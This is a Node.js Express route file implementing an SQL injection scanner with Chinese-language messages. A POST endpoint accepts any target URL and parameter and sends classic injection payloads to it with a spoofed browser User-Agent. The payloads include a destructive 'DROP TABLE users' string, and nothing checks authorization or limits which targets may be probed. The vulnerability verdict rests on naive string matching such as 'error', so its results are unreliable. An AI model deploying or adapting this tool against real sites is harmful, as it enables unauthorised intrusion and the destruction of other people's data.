const express = require('express')
const router = express.Router()
const axios = require('axios')

const payloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 'x'='x",
  "\" OR \"1\"=\"1",
  "' UNION SELECT 1,2,3--",
  "'; DROP TABLE users--"
]

router.post('/test', async (req, res) => {
  const { url, parameter, method = 'GET' } = req.body
  
  if (!url || !parameter) {
    return res.status(400).json({ error: '请提供目标URL和参数名' })
  }
  
  let vulnerable = false
  const results = []
  
  for (const payload of payloads) {
    try {
      let response
      const testPayload = encodeURIComponent(payload)
      
      if (method === 'GET') {
        const separator = url.includes('?') ? '&' : '?'
        const testUrl = `${url}${separator}${parameter}=${testPayload}`
        response = await axios.get(testUrl, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          },
          timeout: 10000,
          validateStatus: () => true
        })
      } else {
        const data = {}
        data[parameter] = payload
        response = await axios.post(url, data, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          },
          timeout: 10000,
          validateStatus: () => true
        })
      }
      
      const isVulnerable = response.status === 200 && 
        (response.data.includes('SQL') || 
         response.data.includes('mysql') || 
         response.data.includes('error') ||
         response.data.includes('syntax'))
      
      results.push({
        payload,
        status: response.status,
        vulnerable: isVulnerable
      })
      
      if (isVulnerable) {
        vulnerable = true
      }
    } catch (error) {
      results.push({
        payload,
        error: error.message,
        vulnerable: false
      })
    }
  }
  
  res.json({
    success: true,
    vulnerable,
    url,
    parameter,
    method,
    tests: results,
    detected: vulnerable ? 'SQL注入漏洞已检测到' : '未检测到SQL注入漏洞'
  })
})

module.exports = router